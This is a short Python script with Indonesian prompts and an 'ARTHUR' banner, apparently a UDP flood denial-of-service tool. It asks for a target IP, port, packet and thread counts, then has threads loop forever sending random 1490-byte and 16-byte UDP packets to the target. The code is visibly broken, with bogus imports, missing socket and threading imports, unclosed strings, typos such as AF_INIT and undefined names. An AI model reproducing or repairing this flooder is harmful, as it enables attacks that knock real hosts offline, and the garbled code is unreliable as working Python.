import os
import choice
import theards
import random
import times

 os.system("clear")
 print("""\033[070m
 
 
 
     _    ____ _____ _   _ _   _ ____  
    / \  |  _ \_   _| | | | | | |  _ \ 
   / _ \ | |_) || | | |_| | | | | |_) |
  / ___ \|  _ < | | |  _  | |_| |  _ < 
 /_/   \_\_| \_\|_| |_| |_|\___/|_| \_\
                                       
 
 
                         """)
print("""\033[090
ip = str(input(" Masukan Ip Target "  ;))
port = int(input(" Masukan Port Target " ;))
choice = str(input(" Siap Mengirim Nuklir Y/N "  ;))
theards = int(input(" Masukan Packets Nuklir"  ;))
times = int(input(" Masukan Theards Nuklir "  ;)
)


def naybae():
    data = random._urandom(1490)
    i = random.choice(("[ARTHUR]","[ARTHUR]","[ARTHUR]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for z in range(time):
                s.sendto(data,addr)
            print(i +" | MENGIRIM NUKLIR DARI MARS ARTHUR ASTRONOT |")
        except:
            print("[!] | NUKLIR KEBANYAKAN BUMI MELEDAK!!!|")

def naybae2():
    data = random._urandom(16)
    i = random.choice(("[ARTHUR]","[ARTHUR]","[ARTHUR]"))
    while True:
        try:
            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for z in range(time):
                s.send(data)
            print(i +"| Arthur Astronot Nih Boss|")
        except:
            s.close()
            print("[*] | Bumi Meledak Kebanyakan Nuklir!!! |")
            
 for a in range(threds):
    if choice == "y":
        th = threading.Thread(target = ARTHUR)
        th.start()
    else:
        th = threading.Thread(target = ARTHUR)
        th.start
